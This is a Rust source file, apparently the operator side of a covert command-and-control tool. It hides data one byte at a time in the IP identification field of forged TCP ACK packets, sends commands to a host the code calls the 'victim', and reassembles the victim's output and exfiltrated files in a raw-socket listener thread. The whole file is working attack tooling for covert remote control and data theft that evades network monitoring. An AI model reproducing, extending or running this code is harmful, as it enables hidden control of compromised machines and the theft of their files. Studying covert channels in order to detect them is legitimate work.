use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::packet::ethernet::{EthernetPacket, EtherTypes};
use pnet::packet::ipv4::{MutableIpv4Packet, Ipv4Packet, checksum};
use pnet::packet::tcp::{MutableTcpPacket, TcpFlags, TcpPacket, ipv4_checksum};
use pnet::packet::Packet;
use std::net::Ipv4Addr;
use pnet::datalink::{DataLinkSender, DataLinkReceiver, NetworkInterface, channel, Channel};
use std::sync::atomic::{AtomicU16, AtomicBool, Ordering};
use std::sync::Arc;
use std::thread;
use std::time::Duration;
use std::io::{self, Write};

// These MUST be public so main.rs can see them for command logic
pub const CMD_EOF: u8 = 0x41;
pub const CMD_START_TRANSFER: u8 = 0x40;

static IPID_COUNTER: AtomicU16 = AtomicU16::new(0);

pub struct ChannelConfig {
    pub target_ip: Ipv4Addr,
    pub local_ip: Ipv4Addr,
    pub send_port: u16,    
    pub listen_port: u16,  
}

pub struct CovertChannel {
    pub config: Arc<ChannelConfig>,
    pub tx: Box<dyn DataLinkSender>,
    pub running: Arc<AtomicBool>, 
}

impl CovertChannel {
    pub fn new(
        interface: &NetworkInterface,
        target_ip: Ipv4Addr,
        local_ip: Ipv4Addr,
        send_port: u16,
        listen_port: u16,
    ) -> (Self, Box<dyn DataLinkReceiver>) {
        let (tx, rx) = match channel(interface, Default::default()) {
            Ok(Channel::Ethernet(tx, rx)) => (tx, rx),
            _ => panic!("[!] Failed to open raw channel. Run with sudo/root privileges."),
        };

        let config = Arc::new(ChannelConfig {
            target_ip,
            local_ip,
            send_port,
            listen_port,
        });

        (Self { 
            config, 
            tx, 
            running: Arc::new(AtomicBool::new(true)) 
        }, rx)
    }

    /// Signals the listener thread to shut down
    pub fn stop(&self) {
        self.running.store(false, Ordering::Relaxed);
    }

    pub fn send_byte(&mut self, byte: u8) {
        let mut buffer = [0u8; 40];
        let (ip_slice, tcp_slice) = buffer.split_at_mut(20);

        let mut ip_packet = MutableIpv4Packet::new(ip_slice).unwrap();
        ip_packet.set_version(4);
        ip_packet.set_header_length(5);
        ip_packet.set_total_length(40);
        ip_packet.set_ttl(64);
        ip_packet.set_next_level_protocol(IpNextHeaderProtocols::Tcp);
        ip_packet.set_source(self.config.local_ip);
        ip_packet.set_destination(self.config.target_ip);
        ip_packet.set_flags(2); // Set Don't Fragment

        // Encode data in the lower 8 bits of IPID
        let current_count = IPID_COUNTER.fetch_add(1, Ordering::Relaxed);
        let upper = (current_count & 0x00FF) << 8;
        let covert_id = upper | (byte as u16);
        ip_packet.set_identification(covert_id);

        let mut tcp_packet = MutableTcpPacket::new(tcp_slice).unwrap();
        tcp_packet.set_source(self.config.listen_port); 
        tcp_packet.set_destination(self.config.send_port);
        tcp_packet.set_window(64240);
        tcp_packet.set_data_offset(5);
        tcp_packet.set_flags(TcpFlags::ACK);
        tcp_packet.set_sequence(0x11111111);
        tcp_packet.set_acknowledgement(0x22222222);

        let tcp_checksum = ipv4_checksum(&tcp_packet.to_immutable(), &self.config.local_ip, &self.config.target_ip);
        tcp_packet.set_checksum(tcp_checksum);
        
        let ip_checksum = checksum(&ip_packet.to_immutable());
        ip_packet.set_checksum(ip_checksum);

        let _ = self.tx.send_to(ip_packet.packet(), None);
    }

    pub fn send_command(&mut self, cmd: &str) {
        for b in cmd.as_bytes() {
            self.send_byte(*b);
            thread::sleep(Duration::from_millis(15));
        }
        self.send_byte(b'\n');
    }
}

pub fn start_listening(mut rx: Box<dyn DataLinkReceiver>, config: Arc<ChannelConfig>, running: Arc<AtomicBool>) {
    thread::spawn(move || {
        let mut binary_mode = false;
        let mut file_data = Vec::new();

        println!("[*] Covert Listener Active. Monitoring incoming traffic...");

        while running.load(Ordering::Relaxed) {
            match rx.next() {
                Ok(packet) => {
                    // Use EthernetPacket to handle link-layer offset automatically (solves wlp8s0 issues)
                    if let Some(eth) = EthernetPacket::new(packet) {
                        if eth.get_ethertype() == EtherTypes::Ipv4 {
                            if let Some(ip) = Ipv4Packet::new(eth.payload()) {
                                // Filter by Victim IP and ensure it's TCP
                                if ip.get_source() == config.target_ip && ip.get_next_level_protocol() == IpNextHeaderProtocols::Tcp {
                                    if let Some(tcp) = TcpPacket::new(ip.payload()) {
                                        // Ensure packet is destined for our designated RX port
                                        if tcp.get_destination() == config.listen_port {
                                            let byte = (ip.get_identification() & 0x00FF) as u8;
                                            
                                            match byte {
                                                CMD_START_TRANSFER => {
                                                    binary_mode = true;
                                                    file_data.clear();
                                                    println!("\n[!] File transfer started...");
                                                },
                                                CMD_EOF => {
                                                    if binary_mode {
                                                        println!("\n[+] Transfer complete. Received {} bytes.", file_data.len());
                                                        binary_mode = false;
                                                    }
                                                },
                                                _ => {
                                                    if binary_mode {
                                                        file_data.push(byte);
                                                    } else {
                                                        print!("{}", byte as char);
                                                        let _ = io::stdout().flush();
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
                Err(_) => continue,
            }
        }
        println!("\n[*] Listener thread exiting gracefully.");
    });
}
